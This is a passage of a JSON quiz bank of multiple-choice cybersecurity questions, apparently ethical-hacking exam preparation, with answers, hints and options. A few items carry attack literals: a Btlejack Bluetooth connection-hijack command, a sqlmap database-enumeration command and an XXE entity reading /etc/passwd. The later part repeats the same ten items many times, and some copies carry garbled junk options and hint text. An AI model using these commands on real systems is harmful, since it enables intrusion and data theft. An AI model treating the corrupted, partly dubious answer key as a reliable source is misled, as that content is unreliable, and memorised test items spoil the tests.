      "She should scan the network using Nmap to check the MAC addresses of all the hosts and look for duplicates.",
      "She can't identify such an attack and must use a VPN to protect her traffic.",
      "She should check her ARP table and see if there is one IP address with two different MAC addresses.",
      "She should use netstat to check for any suspicious connections with another IP address within the LAN."
    ]
  },
  {
    "question": "The attacker performs the attack using micro:bit and Btlejack, gradually executed different commands in the console. After executing this attack, he was able to read and export sensitive information shared between connected devices. Which of the following commands did the attacker use to hijack the connections?",
    "answer": "btlejack -f 0x9c68fd30 -t -m 0x1fffffffff",
    "hint": null,
    "options": [
      "btlejack -d /dev/ttyACM0 -d /dev/ttyACM2 -s",
      "btlejack -f 0x9c68fd30 -t -m 0x1fffffffff",
      "btlejack -c any",
      "btlejack -s"
    ]
  },
  {
    "question": "Experienced employees of the EC-Council monitor the market of security providers every day in search of the best solutions for your business. According to EC-Council experts, which vulnerability scanner combines comprehensive static and dynamic security checks to detect vulnerabilities such as XSS, File Inclusion, SQL injection, command execution, and more?",
    "answer": "Syhunt Hybrid",
    "hint": null,
    "options": [
      "Saleae Logic Analyzer",
      "Syhunt Hybrid",
      "Cisco ASA",
      "AT&T USM Anywhere"
    ]
  },
  {
    "question": "Ivan, the black hat hacker, plugged in a rogue switch to an unused port in the LAN with a priority lower than any other switch in the network so that he could make it a root bridge that will later allow him to sniff all the traffic in the target's network. What attack did Ivan perform?",
    "answer": "STP attack.",
    "hint": null,
    "options": [
      "VLAN hopping.",
      "ARP spoofing.",
      "DNS poisoning.",
      "STP attack."
    ]
  },
  {
    "question": "In which of the following Logging framework was a vulnerability discovered in December 2021 that could cause damage to millions of devices and Java applications?",
    "answer": "Log4J",
    "hint": null,
    "options": [
      "Log4J",
      "Logback",
      "SLF4J",
      "Apache Commons Logging"
    ]
  },
  {
    "question": "You have been instructed to collect information about specific threats to the organization. You decide to collect the information from humans, social media, chat rooms, and events that resulted in cyberattacks. You also prepared a report that includes identified malicious activities, recommended courses of action, and warnings for emerging attacks in this process. Thanks to this information, you were able to disclose potential risks and gain insight into attacker methodologies. What is the type of threat intelligence collected by you?",
    "answer": "Operational threat intelligence.",
    "hint": null,
    "options": [
      "Tactical threat intelligence.",
      "Strategic threat intelligence.",
      "Technical threat intelligence.",
      "Operational threat intelligence."
    ]
  },
  {
    "question": "Identify the technology according to the description: It's an open-source technology that can help in developing, packaging, and running applications. Also, the technology provides PaaS through OS-level virtualization, delivers containerized software packages, and promotes fast software delivery. This technology can isolate applications from the underlying infrastructure and stimulating communication via well-defined channels.",
    "answer": "Docker",
    "hint": null,
    "options": [
      "Serverless computing",
      "Paravirtualization",
      "Docker",
      "Virtual machine"
    ]
  },
  {
    "question": "Alex received an order to conduct a pentest and scan a specific server. When receiving the technical task, he noticed the point: \"The attacker must scan every port on the server several times using a set of spoofed source IP addresses.\" Which of the following Nmap flags will allow Alex to fulfill this requirement?",
    "answer": "-D",
    "hint": null,
    "options": [
      "-D",
      "-S",
      "-f",
      "-A",
      "-Tra",
      "-Msc"
    ]
  },
  {
    "question": "The attacker gained credentials of an organization's internal server system and often logged in outside work hours. The organization commissioned the cybersecurity department to analyze the compromised device to find incident details such as the type of attack, its severity, target, impact, method of propagation, and vulnerabilities exploited. What is the incident handling and response process, in which the cybersecurity department has determined these issues?",
    "answer": "Incident triage.",
    "hint": null,
    "options": [
      "Eradication.",
      "Preparation.",
      "Incident triage.",
      "Incident recording and assignment."
    ]
  },
  {
    "question": "You have been instructed to organize the possibility of working remotely for employees. Their remote connections could be exposed to session hijacking during the work, and you want to prevent this possibility. You decide to use the technology that creates a safe and encrypted tunnel over a public network to securely send and receive sensitive information and prevent hackers from decrypting the data flow between the endpoints. Which of the following technologies will you use?",
    "answer": "VPN",
    "hint": null,
    "options": [
      "VPN",
      "Split tunneling",
      "DMZ",
      "Bastion host"
    ]
  },
  {
    "question": "sqlmap.py -u \"http://10.10.37.12/?p=1&forumaction=search\" --dbs",
    "answer": "Enumerating the databases in the DBMS for the URL.",
    "hint": null,
    "options": [
      "Creating backdoors using SQL injection.",
      "Enumerating the databases in the DBMS for the URL.",
      "Retrieving SQL statements being executed on the database.",
      "Searching database statements at the IP address given."
    ]
  },
  {
    "question": "The company hired a cybersecurity specialist to conduct an audit of their mobile application. On the first day of work, the specialist suggested starting with the fact that he would extract the source code of a mobile application and disassemble the application to analyze its design flaws. He is sure that using this technique, he can fix bugs in the application, discover underlying vulnerabilities, and improve defence strategies against attacks. Which of the following techniques will the specialist use?",
    "answer": "Reverse engineering.",
    "hint": null,
    "options": [
      "Jailbreaking.",
      "Reverse engineering.",
      "Rooting.",
      "Application sandboxing."
    ]
  },
  {
    "question": "The attacker wants to draw a map of the target organization's network infrastructure to know about the actual environment they will hack. Which of the following will allow him to do this?",
    "answer": "Scanning networks",
    "hint": null,
    "options": [
      "Vulnerability analysis",
      "Malware analysis",
      "Network enumeration",
      "Scanning networks"
    ]
  },
  {
    "question": "Which of the following is a type of malware that spreads from one system to another or from one network to another and causes similar types of damage as viruses to do to the infected system?",
    "answer": "Worm",
    "hint": null,
    "options": [
      "Worm",
      "Rootkit",
      "Adware",
      "Trojan"
    ]
  },
  {
    "question": "<DOCTYPE checksometing [<!ENTITY xxx SYSTEM \"file:///etc/passwd\">]>",
    "answer": "XXE",
    "hint": null,
    "options": [
      "XXS",
      "IDOR",
      "XXE",
      "SQLi"
    ]
  },
  {
    "question": "At which of the following steps of the Cyber Kill Chain is the creation of a malware weapon, for example, such as a malicious file disguised as a financial spreadsheet?",
    "answer": "Weaponization",
    "hint": null,
    "options": [
      "Reconnaissance",
      "Exploitation",
      "Delivery",
      "Weaponization"
    ]
  },
  {
    "question": "Have you spent a lot of time and money on creating photo materials for your business? You probably don't want anyone else to use them. But you don't need to hire a cool hacker to solve this problem. There is a reasonably simple method using search engines to search for photographs, profile pictures, and memes. What method are we talking about?",
    "answer": "Reverse image search",
    "hint": null,
    "options": [
      "Google advanced search",
      "Google dorking",
      "Reverse image search",
      "Metasearch engines"
    ]
  },
  {
    "question": "Black-hat hacker Ivan attacked a large DNS server. By poisoning the cache, he was able to redirect the online store's traffic to a phishing site. Users did not notice the problem and believed that they were on the store's actual website, so they entered the data of their accounts and even bank cards. Before the security system had time to react, Ivan collected a large amount of critical user data. Which option is best suited to describe this attack?",
    "answer": "Pharming",
    "hint": null,
    "options": [
      "SPIT attack",
      "Spear-phishing",
      "Pharming",
      "Phishing"
    ]
  },
  {
    "question": "Lisandro was hired to steal critical business documents of a competitor company. Using a vulnerability in over-the-air programming (OTA programming) on Android smartphones, he sends messages to company employees on behalf of the network operator, asking them to enter a PIN code and accept new updates for the phone. After the employee enters the PIN code, Lisandro gets the opportunity to intercept all Internet traffic from the phone. What type of attack did Lisandro use?",
    "answer": "Advanced SMS phishing.",
    "hint": null,
    "options": [
      "Bypass SSL pinning.",
      "Advanced SMS phishing.",
      "Tap 'n ghost attack.",
      "Social engineering."
    ]
  },
  {
    "question": "In which of the following cloud service models do you take full responsibility for the maintenance of the cloud-based resources?",
    "answer": "IaaS",
    "hint": null,
    "options": [
      "PaaS",
      "IaaS",
      "SaaS",
      "BaaS"
    ]
  },
  {
    "question": "Passwords are rarely stored in plain text, most often, one-way conversion (hashing) is performed to protect them from unauthorized access. However, there are some attacks and tools to crack the hash. Look at the following tools and select the one that can NOT be used for this.",
    "answer": "Netcat",
    "hint": null,
    "options": [
      "Hashcat",
      "Netcat",
      "Ophcrack",
      "John the Ripper"
    ]
  },
  {
    "question": "Ivan, a black hacker, wants to attack the target company. He thought about the fact that vulnerable IoT devices could be used in the company. To check this, he decides to use the tool, scan the target network for specific types of IoT devices and detect whether they are using the default, factory-set credentials. Which of the following tools will Ivan use?",
    "answer": "IoTSeeker",
    "hint": null,
    "options": [
      "IoTSeeker",
      "Cloud IoT Core",
      "Bullguard IoT",
      "Azure IoT Central"
    ]
  },
  {
    "question": "Your company started working with a cloud service provider, and after a while, they were disappointed with their service and wanted to move to another CSP. Which of the following can become a problem when changing to a new CSP?",
    "answer": "Lock-in",
    "hint": null,
    "options": [
      "Lock-in",
      "Lock-up",
      "Lock-down",
      "Virtualization"
    ]
  },
  {
    "question": "Which of the following standards is most applicable for a major credit card company?",
    "answer": "PCI-DSS",
    "hint": null,
    "options": [
      "Sarbanes-Oxley Act",
      "HIPAA",
      "PCI-DSS",
      "FISMA"
    ]
  },
  {
    "question": "Which of the following parameters is Nmap helps evade IDS or firewalls?",
    "answer": "-T",
    "hint": null,
    "options": [
      "-A",
      "-T",
      "-R",
      "-r"
    ]
  },
  {
    "question": "Which of the following is a rootkit that adds additional code or replaces portions of the core operating system to obscure a backdoor on a system?",
    "answer": "Kernel-level rootkit.",
    "hint": null,
    "options": [
      "User-mode rootkit.",
      "Hypervisor-level rootkit.",
      "Kernel-level rootkit.",
      "Application-level Rootkit."
    ]
  },
  {
    "question": "The boss has instructed you to test the company's network from the attacker's point of view to find out what exploits and vulnerabilities are accessible to the outside world by using devices such as firewalls, routers, and servers. During this process, you should also external assessment estimates the threat of network security attacks external to the organization. What type of vulnerability assessment should you perform?",
    "answer": "External assessment",
    "hint": null,
    "options": [
      "External assessment",
      "Passive assessment",
      "Active Assessments",
      "Host-based Assessments"
    ]
  },
  {
    "question": "Which of the following types of attack does the use of Wi-Fi Pineapple belong to run an access point with a legitimate-looking SSID for a nearby business?",
    "answer": "Evil-twin attack",
    "hint": null,
    "options": [
      "Wardriving attack",
      "MAC spoofing attack",
      "Phishing attack",
      "Evil-twin attack"
    ]
  },
  {
    "question": "Which antenna is commonly used in communications for a frequency band of 10 MHz to VHF and UHF?",
    "answer": "Yagi antenna",
    "hint": null,
    "options": [
      "Omnidirectional antenna",
      "Parabolic grid antenna",
      "Dipole antenna",
      "Yagi antenna"
    ]
  },
  {
    "question": "WPS is a rather troubled wireless network security standard. While it can make your life easier, it is also vulnerable to attacks. An attacker within radio range can brute-force the WPS PIN for a vulnerable access point, obtain WEP or WPA passwords, and likely gain access to the Wi-Fi network. However, first, the attacker needs to find a vulnerable point. Which of the following tools is capable of determining WPS-enabled access points?",
    "answer": "wash",
    "hint": null,
    "options": [
      "wash",
      "net view",
      "macof",
      "ntptrace"
    ]
  },
  {
    "question": "Identify technique for securing the cloud resources according to describe below: This technique assumes by default that a user attempting to access the network is not an authentic entity and verifies every incoming connection before allowing access to the network. When using this technique imposed conditions such that employees can access only the resources required for their role.",
    "answer": "Zero trust network",
    "hint": null,
    "options": [
      "Container technology",
      "Zero trust network",
      "Serverless computing",
      "DMZ"
    ]
  },
  {
    "question": "Identify the type of SQLi by description: This type of SQLi doesn't show any error message. Its use may be problematic due to as it returns information when the application is given SQL payloads that elicit a true or false response from the server. When the attacker uses this method, an attacker can extract confidential information by observing the responses.",
    "answer": "Blind SQLi",
    "hint": null,
    "options": [
      "Union SQLi",
      "Error-based SQLi",
      "Blind SQLi",
      "Out-of-band SQLi"
    ]
  },
  {
    "question": "Which of the following frameworks contains a set of the most popular tools that facilitate your tasks of collecting information and data from open sources?",
    "answer": "OSINT framework",
    "hint": null,
    "options": [
      "WebSploit Framework",
      "BeEF",
      "OSINT framework",
      "Speed Phish Framework"
    ]
  },
  {
    "question": "Which protocol is commonly exploited by attackers to perform a 'Man-in-the-Middle' attack due to its lack of authentication?",
    "answer": "ARP",
    "hint": "This protocol resolves IP addresses to MAC addresses on a local area network.",
    "options": [
      "HTTP",
      "DNS",
      "ARP",
      "FTP"
    ]
  },
  {
    "question": "What type of attack involves injecting malicious code into a website's input fields to manipulate back-end SQL databases?",
    "answer": "SQL Injection",
    "hint": "This attack exploits vulnerabilities in database query execution.",
    "options": [
      "Cross-Site Scripting (XSS)",
      "SQL Injection",
      "Denial of Service (DoS)",
      "Phishing"
    ]
  },
  {
    "question": "Which encryption method uses the same key for both encryption and decryption?",
    "answer": "Symmetric encryption",
    "hint": "This type of encryption is faster but requires secure key distribution.",
    "options": [
      "Asymmetric encryption",
      "Symmetric encryption",
      "Hashing",
      "Steganography"
    ]
  },
  {
    "question": "What is the primary function of a firewall in network security?",
    "answer": "To monitor and control incoming and outgoing network traffic based on predetermined security rules",
    "hint": "Firewalls act as a barrier between trusted and untrusted networks.",
    "options": [
      "To encrypt data transmissions",
      "To detect and remove malware",
      "To monitor and control incoming and outgoing network traffic based on predetermined security rules",
      "To manage user authentication and authorization"
    ]
  },
  {
    "question": "Which of the following is a technique used to gather information about a target system's operating system and version?",
    "answer": "OS fingerprinting",
    "hint": "This technique analyzes network responses to determine the OS.",
    "options": [
      "Port scanning",
      "OS fingerprinting",
      "Social engineering",
      "Phishing"
    ]
  },
  {
    "question": "In the context of wireless network security, what does WPA2 stand for?",
    "answer": "Wi-Fi Protected Access 2",
    "hint": "It's a security protocol developed to secure wireless networks.",
    "options": [
      "Wireless Protected Authentication 2",
      "Wi-Fi Protected Access 2",
      "Wireless Protocol Association 2",
      "Wi-Fi Protected Algorithm 2"
    ]
  },
  {
    "question": "Which tool is commonly used for password cracking by performing a brute-force attack?",
    "answer": "John the Ripper",
    "hint": "This tool is a fast password cracker, primarily used for Unix-based systems.",
    "options": [
      "Nessus",
      "John the Ripper",
      "Wireshark",
      "Nmap"
    ]
  },
  {
    "question": "What is the main goal of a Denial-of-Service (DoS) attack?",
    "answer": "To make a network resource unavailable to its intended users",
    "hint": "This attack overwhelms the target with traffic or requests.",
    "options": [
      "To steal confidential information",
      "To gain unauthorized access to a system",
      "To make a network resource unavailable to its intended users",
      "To deface a website"
    ]
  },
  {
    "question": "Which protocol is commonly exploited by attackers to perform a 'Man-in-the-Middle' attack due to its lack of authentication?",
    "answer": "ARP",
    "hint": "This protocol resolves IP addresses to MAC addresses on a local area network.",
    "options": [
      "HTTP",
      "DNS",
      "ARP",
      "FTP"
    ]
  },
  {
    "question": "What type of attack involves injecting malicious code into a website's input fields to manipulate back-end SQL databases?",
    "answer": "SQL Injection",
    "hint": "This attack exploits vulnerabilities in database query execution.",
    "options": [
      "Cross-Site Scripting (XSS)",
      "SQL Injection",
      "Denial of Service (DoS)",
      "Phishing"
    ]
  },
  {
    "question": "Which encryption method uses the same key for both encryption and decryption?",
    "answer": "Symmetric encryption",
    "hint": "This type of encryption is faster but requires secure key distribution.",
    "options": [
      "Asymmetric encryption",
      "Symmetric encryption",
      "Hashing",
      "Steganography"
    ]
  },
  {
    "question": "What is the primary function of a firewall in network security?",
    "answer": "To monitor and control incoming and outgoing network traffic based on predetermined security rules",
    "hint": "Firewalls act as a barrier between trusted and untrusted networks.",
    "options": [
      "To encrypt data transmissions",
      "To detect and remove malware",
      "To monitor and control incoming and outgoing network traffic based on predetermined security rules",
      "To manage user authentication and authorization"
    ]
  },
  {
    "question": "Which of the following is a technique used to gather information about a target system's operating system and version?",
    "answer": "OS fingerprinting",
    "hint": "This technique analyzes network responses to determine the OS.",
    "options": [
      "Port scanning",
      "OS fingerprinting",
      "Social engineering",
      "Phishing"
    ]
  },
  {
    "question": "In the context of wireless network security, what does WPA2 stand for?",
    "answer": "Wi-Fi Protected Access 2",
    "hint": "It's a security protocol developed to secure wireless networks.",
    "options": [
      "Wireless Protected Authentication 2",
      "Wi-Fi Protected Access 2",
      "Wireless Protocol Association 2",
      "Wi-Fi Protected Algorithm 2"
    ]
  },
  {
    "question": "Which tool is commonly used for password cracking by performing a brute-force attack?",
    "answer": "John the Ripper",
    "hint": "This tool is a fast password cracker, primarily used for Unix-based systems.",
    "options": [
      "Nessus",
      "John the Ripper",
      "Wireshark",
      "Nmap"
    ]
  },
  {
    "question": "What is the main goal of a Denial-of-Service (DoS) attack?",
    "answer": "To make a network resource unavailable to its intended users",
    "hint": "This attack overwhelms the target with traffic or requests.",
    "options": [
      "To steal confidential information",
      "To gain unauthorized access to a system",
      "To make a network resource unavailable to its intended users",
      "To deface a website"
    ]
  },
  {
    "question": "Which protocol is commonly exploited by attackers to perform a 'Man-in-the-Middle' attack due to its lack of authentication?",
    "answer": "ARP",
    "hint": "This protocol resolves IP addresses to MAC addresses on a local area network.",
    "options": [
      "HTTP",
      "DNS",
      "ARP",
      "FTP"
    ]
  },
  {
    "question": "What type of attack involves injecting malicious code into a website's input fields to manipulate back-end SQL databases?",
    "answer": "SQL Injection",
    "hint": "This attack exploits vulnerabilities in database query execution.",
    "options": [
      "Cross-Site Scripting (XSS)",
      "SQL Injection",
      "Denial of Service (DoS)",
      "Phishing"
    ]
  },
  {
    "question": "Which encryption method uses the same key for both encryption and decryption?",
    "answer": "Symmetric encryption",
    "hint": "This type of encryption is faster but requires secure key distribution.",
    "options": [
      "Asymmetric encryption",
      "Symmetric encryption",
      "Hashing",
      "Steganography"
    ]
  },
  {
    "question": "What is the primary function of a firewall in network security?",
    "answer": "To monitor and control incoming and outgoing network traffic based on predetermined security rules",
    "hint": "Firewalls act as a barrier between trusted and untrusted networks.",
    "options": [
      "To encrypt data transmissions",
      "To detect and remove malware",
      "To monitor and control incoming and outgoing network traffic based on predetermined security rules",
      "To manage user authentication and authorization"
    ]
  },
  {
    "question": "Which of the following is a technique used to gather information about a target system's operating system and version?",
    "answer": "OS fingerprinting",
    "hint": "This technique analyzes network responses to determine the OS.",
    "options": [
      "Port scanning",
      "OS fingerprinting",
      "Social engineering",
      "Phishing"
    ]
  },
  {
    "question": "In the context of wireless network security, what does WPA2 stand for?",
    "answer": "Wi-Fi Protected Access 2",
    "hint": "It's a security protocol developed to secure wireless networks.",
    "options": [
      "Wireless Protected Authentication 2",
      "Wi-Fi Protected Access 2",
      "Wireless Protocol Association 2",
      "Wi-Fi Protected Algorithm 2"
    ]
  },
  {
    "question": "Which tool is commonly used for password cracking by performing a brute-force attack?",
    "answer": "John the Ripper",
    "hint": "This tool is a fast password cracker, primarily used for Unix-based systems.",
    "options": [
      "Nessus",
      "John the Ripper",
      "Wireshark",
      "Nmap"
    ]
  },
  {
    "question": "What is the main goal of a Denial-of-Service (DoS) attack?",
    "answer": "To make a network resource unavailable to its intended users",
    "hint": "This attack overwhelms the target with traffic or requests.",
    "options": [
      "To steal confidential information",
      "To gain unauthorized access to a system",
      "To make a network resource unavailable to its intended users",
      "To deface a website"
    ]
  },
  {
    "question": "Which protocol is commonly exploited by attackers to perform a 'Man-in-the-Middle' attack due to its lack of authentication?",
    "answer": "ARP",
    "hint": "This protocol resolves IP addresses to MAC addresses on a local area network.",
    "options": [
      "HTTP",
      "DNS",
      "ARP",
      "FTP"
    ]
  },
  {
    "question": "What type of attack involves injecting malicious code into a website's input fields to manipulate back-end SQL databases?",
    "answer": "SQL Injection",
    "hint": "This attack exploits vulnerabilities in database query execution.",
    "options": [
      "Cross-Site Scripting (XSS)",
      "SQL Injection",
      "Denial of Service (DoS)",
      "Phishing"
    ]
  },
  {
    "question": "Which encryption method uses the same key for both encryption and decryption?",
    "answer": "Symmetric encryption",
    "hint": "This type of encryption is faster but requires secure key distribution.",
    "options": [
      "Asymmetric encryption",
      "Symmetric encryption",
      "Hashing",
      "Steganography"
    ]
  },
  {
    "question": "What is the primary function of a firewall in network security?",
    "answer": "To monitor and control incoming and outgoing network traffic based on predetermined security rules",
    "hint": "Firewalls act as a barrier between trusted and untrusted networks.",
    "options": [
      "To encrypt data transmissions",
      "To detect and remove malware",
      "To monitor and control incoming and outgoing network traffic based on predetermined security rules",
      "To manage user authentication and authorization"
    ]
  },
  {
    "question": "Which of the following is a technique used to gather information about a target system's operating system and version?",
    "answer": "OS fingerprinting",
    "hint": "This technique analyzes network responses to determine the OS.",
    "options": [
      "Port scanning",
      "OS fingerprinting",
      "Social engineering",
      "Phishing"
    ]
  },
  {
    "question": "In the context of wireless network security, what does WPA2 stand for?",
    "answer": "Wi-Fi Protected Access 2",
    "hint": "It's a security protocol developed to secure wireless networks.",
    "options": [
      "Wireless Protected Authentication 2",
      "Wi-Fi Protected Access 2",
      "Wireless Protocol Association 2",
      "Wi-Fi Protected Algorithm 2"
    ]
  },
  {
    "question": "Which tool is commonly used for password cracking by performing a brute-force attack?",
    "answer": "John the Ripper",
    "hint": "This tool is a fast password cracker, primarily used for Unix-based systems.",
    "options": [
      "Nessus",
      "John the Ripper",
      "Wireshark",
      "Nmap"
    ]
  },
  {
    "question": "What is the main goal of a Denial-of-Service (DoS) attack?",
    "answer": "To make a network resource unavailable to its intended users",
    "hint": "This attack overwhelms the target with traffic or requests.",
    "options": [
      "To steal confidential information",
      "To gain unauthorized access to a system",
      "To make a network resource unavailable to its intended users",
      "To deface a website"
    ]
  },
  {
    "question": "Which protocol is commonly exploited by attackers to perform a 'Man-in-the-Middle' attack due to its lack of authentication?",
    "answer": "ARP",
    "hint": "This protocol resolves IP addresses to MAC addresses on a local area network.",
    "options": [
      "HTTP",
      "DNS",
      "ARP",
      "FTP",
      "HTR",
      "TRH",
      "MSC"
    ]
  },
  {
    "question": "Which protocol is commonly exploited by attackers to perform a 'Man-in-the-Middle' attack due to its lack of authentication?",
    "answer": "ARP",
    "hint": "This protocol resolves IP addresses to MAC *htr:)* addresses on a local area network.",
    "options": [
      "HTTP",
      "DNS",
      "ARP",
      "FTP",
      "HTR",
      "TRH",
      "MSC"
    ]
  },
  {
    "question": "What type of attack involves injecting malicious code into a website's input fields to manipulate back-end SQL databases?",
    "answer": "SQL Injection",
    "hint": "This attack exploits vulnerabilities in database query execution.",
    "options": [
      "Cross-Site Scripting (XSS)",
      "SQL Injection",
      "Denial of Service (DoS)",
      "Phishing"
    ]
  },
  {
    "question": "Which encryption method uses the same key for both encryption and decryption?",
    "answer": "Symmetric encryption",
    "hint": "This type of encryption is faster but requires secure key distribution.",
    "options": [
      "Asymmetric encryption",
      "Symmetric encryption",
      "Hashing",
      "Steganography"
    ]
  },
  {
    "question": "What is the primary function of a firewall in network security?",
    "answer": "To monitor and control incoming and outgoing network traffic based on predetermined security rules",
    "hint": "Firewalls act as a barrier between trusted and untrusted networks.",
    "options": [
      "To encrypt data transmissions",
      "To detect and remove malware",
      "To monitor and control incoming and outgoing network traffic based on predetermined security rules",
      "To manage user authentication and authorization"
    ]
  },
  {
    "question": "Which of the following is a technique used to gather information about a target system's operating system and version?",
    "answer": "OS fingerprinting",
    "hint": "This technique analyzes network responses to determine the OS.",
    "options": [
      "Port scanning",
      "OS fingerprinting",
      "Social engineering",
      "Phishing"
    ]
  },
  {
    "question": "In the context of wireless network security, what does WPA2 stand for?",
    "answer": "Wi-Fi Protected Access 2",
    "hint": "It's a security protocol developed to secure wireless networks.",
    "options": [
      "Wireless Protected Authentication 2",
      "Wi-Fi Protected Access 2",
      "Wireless Protocol Association 2",
      "Wi-Fi Protected Algorithm 2"
    ]
  },
  {
    "question": "Which tool is commonly used for password cracking by performing a brute-force attack?",
    "answer": "John the Ripper",
    "hint": "This tool is a fast password cracker, primarily used for Unix-based systems.",
    "options": [
      "Nessus",
      "John the Ripper",
      "Wireshark",
      "Nmap"
    ]
  },
  {
    "question": "What is the main goal of a Denial-of-Service (DoS) attack?",
    "answer": "To make a network resource unavailable to its intended users",
    "hint": "This attack overwhelms the target with traffic or requests.",
    "options": [
      "To steal confidential information",
      "To gain unauthorized access to a system",
      "To make a network resource unavailable to its intended users",
      "To deface a website"
    ]
  },
  {
    "question": "Which of the following tools is primarily used for network scanning and discovery?",
    "answer": "Nmap",
    "hint": "It's a free and open-source utility for network discovery and security auditing.",
    "options": [
      "Nmap",
      "Metasploit",
      "Wireshark",
      "Aircrack-ng",
      "Tmsc"
    ]
  },
  {
    "question": "What is the primary purpose of using a VPN in a corporate environment?",
    "answer": "To securely connect remote users to the company's internal network",
    "hint": "VPNs create encrypted tunnels for secure communication over public networks.",
    "options": [
      "To increase internet speed",
      "To securely connect remote users to the company's internal network",
      "To bypass firewall restrictions",
      "To monitor employee activities",
      "Setup a good wireshark VPN on ur "
    ]
  },
  {
    "question": "What is the primary purpose of using a VPN in a corporate environment?",
    "answer": "To securely connect remote users to the company's internal network",
    "hint": "VPNs create encrypted tunnels for secure communication over public networks.",
    "options": [
      "To increase internet speed",
      "To securely connect remote users to the company's internal network",
      "To bypass firewall restrictions",
      "To monitor employee activities",
      "Not to use VPN together with Thor"
    ]
  },
  {
    "question": "Which of the following tools is primarily used for network scanning and discovery?",
    "answer": "Nmap",
    "hint": "It's a free and open-source utility for network discovery and security auditing.",
    "options": [
      "Nmap",
      "Metasploit",
      "Wireshark",
      "Aircrack-ng"
    ]
  },
  {
    "question": "What is the primary purpose of using a VPN in a corporate environment?",
    "answer": "To securely connect remote users to the company's internal network",
    "hint": "VPNs create encrypted tunnels for secure communication over public networks.",
    "options": [
      "To increase internet speed",
      "To securely connect remote users to the company's internal network",
      "To bypass firewall restrictions",
      "To monitor employee activities"
    ]
  },
  {
    "question": "Which protocol is commonly exploited by attackers to perform a 'Man-in-the-Middle' attack due to its lack of authentication?",
    "answer": "ARP",
    "hint": "This protocol resolves IP addresses to MAC addresses on a local area network.",
    "options": [
      "HTTP",
      "DNS",
      "ARP",
      "FTP"
    ]
  },
  {
    "question": "What type of attack involves injecting malicious code into a website's input fields to manipulate back-end SQL databases?",
    "answer": "SQL Injection",
    "hint": "This attack exploits vulnerabilities in database query execution.",
    "options": [
      "Cross-Site Scripting (XSS)",
      "SQL Injection",
      "Denial of Service (DoS)",
      "Phishing"
    ]
  },
  {
    "question": "Which encryption method uses the same key for both encryption and decryption?",
    "answer": "Symmetric encryption",
    "hint": "This type of encryption is faster but requires secure key distribution.",
    "options": [
      "Asymmetric encryption",
      "Symmetric encryption",
      "Hashing",
      "Steganography"
    ]
  },
  {
    "question": "What is the primary function of a firewall in network security?",
    "answer": "To monitor and control incoming and outgoing network traffic based on predetermined security rules",
    "hint": "Firewalls act as a barrier between trusted and untrusted networks.",
    "options": [
      "To encrypt data transmissions",
      "To detect and remove malware",
      "To monitor and control incoming and outgoing network traffic based on predetermined security rules",
      "To manage user authentication and authorization"
    ]
  },
  {
    "question": "Which of the following is a technique used to gather information about a target system's operating system and version?",
    "answer": "OS fingerprinting",
    "hint": "This technique analyzes network responses to determine the OS.",
    "options": [
      "Port scanning",
      "OS fingerprinting",
      "Social engineering",
      "Phishing"
    ]
  },
  {
    "question": "In the context of wireless network security, what does WPA2 stand for?",
    "answer": "Wi-Fi Protected Access 2",
    "hint": "It's a security protocol developed to secure wireless networks.",
    "options": [
      "Wireless Protected Authentication 2",
      "Wi-Fi Protected Access 2",
      "Wireless Protocol Association 2",
      "Wi-Fi Protected Algorithm 2"
    ]
  },
  {
    "question": "Which tool is commonly used for password cracking by performing a brute-force attack?",
    "answer": "John the Ripper",
    "hint": "This tool is a fast password cracker, primarily used for Unix-based systems.",
    "options": [
      "Nessus",
      "John the Ripper",
      "Wireshark",
      "Nmap"
    ]
  },
  {
    "question": "What is the main goal of a Denial-of-Service (DoS) attack?",
    "answer": "To make a network resource unavailable to its intended users",
    "hint": "This attack overwhelms the target with traffic or requests.",
    "options": [
      "To steal confidential information",
      "To gain unauthorized access to a system",
      "To make a network resource unavailable to its intended users",
      "To deface a website"
    ]
  },
  {
    "question": "Which of the following protocols operates at the transport layer of the OSI model and provides reliable data transmission?",
    "answer": "TCP",
    "hint": "This protocol ensures data is delivered in the same order it was sent.",
    "options": [
      "UDP",
      "TCP",
      "IP",
      "ICMP"
    ]
  },
  {
    "question": "What is the primary purpose of a honeypot in network security?",
    "answer": "To attract and analyze potential attackers",
    "hint": "It's a decoy system designed to lure cyber attackers.",
    "options": [
      "To speed up network performance",
      "To encrypt sensitive data",
      "To attract and analyze potential attackers",
      "To serve as a backup server"
    ]
  },
  {
    "question": "Which of the following is a symmetric key algorithm?",
    "answer": "AES",
    "hint": "This algorithm is widely used for encrypting data and is known for its speed and security.",
    "options": [
      "RSA",
      "AES",
      "ECC",
      "DSA"
    ]
  },
  {
    "question": "In penetration testing, what does the term 'pivoting' refer to?",
    "answer": "Using a compromised system to attack other systems within the same network",
    "hint": "This technique allows attackers to move deeper into a network.",
    "options": [
      "Changing attack methods when one fails",
      "Using a compromised system to attack other systems within the same network",
      "Escalating privileges on a compromised system",
      "Covering tracks to avoid detection"
    ]
  },
  {
    "question": "Which attack involves intercepting and altering communication between two parties without their knowledge?",
    "answer": "Man-in-the-Middle Attack",
    "hint": "The attacker secretly relays and possibly alters the communication between two parties.",
    "options": [
      "Replay Attack",
      "Brute Force Attack",
      "Man-in-the-Middle Attack",
      "Phishing Attack"
    ]
  },
  {
    "question": "What is the main difference between vulnerability assessment and penetration testing?",
    "answer": "Vulnerability assessment identifies vulnerabilities; penetration testing exploits them to assess impact",
    "hint": "One finds weaknesses, the other tests how they can be exploited.",
    "options": [
      "Vulnerability assessment is automated; penetration testing is manual",
      "Vulnerability assessment is cheaper than penetration testing",
      "Vulnerability assessment identifies vulnerabilities; penetration testing exploits them to assess impact",
      "There is no difference; they are the same"
    ]
  },
  {
    "question": "Which tool is commonly used for wireless network auditing and can crack WEP and WPA/WPA2-PSK keys?",
    "answer": "Aircrack-ng",
    "hint": "It's a suite of tools for auditing wireless networks.",
    "options": [
      "Wireshark",
      "Aircrack-ng",
      "Nmap",
      "Metasploit"
    ]
  },
  {
    "question": "What does the term 'phishing' refer to in cybersecurity?",
    "answer": "Fraudulent attempts to obtain sensitive information by disguising as a trustworthy entity",
    "hint": "This attack often involves deceptive emails or websites.",
    "options": [
      "Scanning networks for vulnerabilities",
      "Injecting malicious code into websites",
      "Fraudulent attempts to obtain sensitive information by disguising as a trustworthy entity",
      "Overloading a server to cause a crash"
    ]
  },
  {
    "question": "Which of the following is an example of a hash function?",
    "answer": "SHA-256",
    "hint": "This function generates a fixed-size string from input data of any size.",
    "options": [
      "AES",
      "RSA",
      "SHA-256",
      "3DES"
    ]
  },
  {
    "question": "In the context of social engineering, what is 'shoulder surfing'?",
    "answer": "Observing someone's screen or keyboard to obtain confidential information",
